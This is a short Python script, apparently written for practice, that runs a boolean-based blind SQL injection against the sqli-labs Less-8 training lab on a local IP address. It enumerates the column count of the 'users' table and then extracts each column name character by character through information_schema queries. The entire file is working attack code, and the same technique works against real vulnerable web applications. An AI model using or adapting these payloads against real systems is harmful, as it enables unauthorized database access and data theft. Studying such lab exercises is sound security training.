import requests
 
s = requests.session()
url = "http://192.168.43.190/sqli-labs/Less-8/?id=1"
#判断列数
for l in range(1,50):
    columnNumber_payload = "' and (select count(column_name) from information_schema.columns where table_name='users')="+str(l)+"%23"#选表
    if "You are in..........." in s.get(url+columnNumber_payload).text:
        columnNumber = l
        break
print("columnNumber:",columnNumber)
#爆列名长度
#爆列名
for l in range(0,columnNumber):#第几个表
    columnName = ''
    for i in range(1,50):
        columnLen_payload = "' and length(substr((select column_name from information_schema.columns where table_name='users' limit "+str(l)+",1),1))="+str(i)+"%23"
        if "You are in..........." in s.get(url+columnLen_payload).text:
            columnLen = i
            break
    print("column"+str(l+1)+"Len:",columnLen)
#爆列名
    for m in range(1,columnLen+1):
        for n in range(1,128):
            columnName_payload = "' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit "+str(l)+",1),"+str(m)+",1))="+str(n)+"%23"
            if "You are in..........." in s.get(url+columnName_payload).text:
                columnName = columnName + chr(n)
                break
    print("columnName"+str(l+1)+":"+columnName)